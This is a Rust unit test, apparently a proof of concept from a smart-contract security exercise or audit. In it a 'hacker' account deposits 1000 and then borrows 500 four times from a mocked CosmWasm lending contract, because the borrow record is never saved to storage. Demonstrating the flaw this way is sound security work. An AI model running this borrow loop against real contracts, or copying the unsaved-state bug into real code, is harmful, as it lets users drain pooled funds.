use super::*;
use cosmwasm_std::testing::{mock_env, mock_info, mock_dependencies};
use cosmwasm_std::coins;
use crate::contract::{execute, instantiate};
use cosmwasm_std::{Coin, Uint128};
use crate::msg::{InstantiateMsg, ExecuteMsg};

#[test]
fn exploit() {
    let mut deps = mock_dependencies();

    // Instantiate the contract
    let msg = InstantiateMsg {};
    let info = mock_info("creator", &coins(1000, DENOM.to_string()));
    instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();

    // Hacker deposits 1000 funds
    let info = mock_info("hacker", &coins(1_000, DENOM));
    let msg = ExecuteMsg::Deposit {};
    execute(deps.as_mut(), mock_env(), info, msg).unwrap();

    // Prepare to borrow
    let empty_fund: Vec<Coin> = vec![];
    let info = mock_info("hacker", &empty_fund);
    let msg = ExecuteMsg::Borrow {
        amount: Uint128::from(500_u64),
    };

    // The hacker is able to repeatedly borrow 500 funds because USER_BORROW is not saved into storage
    // The contract should prevent users from borrowing again if they have not repaid their previous borrow
    execute(deps.as_mut(), mock_env(), info.clone(), msg.clone()).unwrap();
    execute(deps.as_mut(), mock_env(), info.clone(), msg.clone()).unwrap();
    execute(deps.as_mut(), mock_env(), info.clone(), msg.clone()).unwrap();
    execute(deps.as_mut(), mock_env(), info, msg).unwrap();
}
